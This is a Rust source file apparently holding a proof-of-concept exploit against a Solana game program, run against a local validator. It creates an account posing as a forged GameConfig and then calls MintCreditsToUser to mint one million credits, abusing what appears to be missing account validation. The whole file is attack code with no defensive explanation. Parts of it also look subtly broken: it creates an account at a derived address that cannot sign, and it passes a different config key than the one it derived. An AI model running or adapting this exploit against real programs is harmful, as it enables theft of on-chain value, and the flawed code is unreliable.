use solana_client::rpc_client::RpcClient;
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    transaction::Transaction,
    system_instruction,
};
use borsh::BorshSerialize;

#[derive(BorshSerialize)]
enum ProgramInstruction {
    MintCreditsToUser { credits: u32 },
}

fn exploit(
    program_id: Pubkey,
    malicious_game_config: Pubkey,
    user_account: Pubkey,
    admin: Keypair,
) -> Result<(), Box<dyn std::error::Error>> {
    let client = RpcClient::new("http://localhost:8899".to_string());
    let (game_config_pda, bump) = Pubkey::find_program_address(
        &[admin.pubkey().as_ref(), b"GAME_CONFIG"],
        &program_id,
    );
    let create_malicious_account = system_instruction::create_account(
        &admin.pubkey(),
        &game_config_pda,
        client.get_minimum_balance_for_rent_exemption(1000)?,
        1000,
        &program_id,
    );
    let create_tx = Transaction::new_signed_with_payer(
        &[create_malicious_account],
        Some(&admin.pubkey()),
        &[&admin],
        client.get_latest_blockhash()?,
    );
    client.send_and_confirm_transaction(&create_tx)?;
    let instruction = Instruction::new_with_borsh(
        program_id,
        &ProgramInstruction::MintCreditsToUser { credits: 1_000_000 },
        vec![
            AccountMeta::new_readonly(malicious_game_config, false),
            AccountMeta::new(user_account, false),
            AccountMeta::new_readonly(admin.pubkey(), true),
        ],
    );
    let mint_tx = Transaction::new_signed_with_payer(
        &[instruction],
        Some(&admin.pubkey()),
        &[&admin],
        client.get_latest_blockhash()?,
    );
    client.send_and_confirm_transaction(&mint_tx)?;
    println!("Exploit: Minted credits using malicious GameConfig");
    Ok(())
}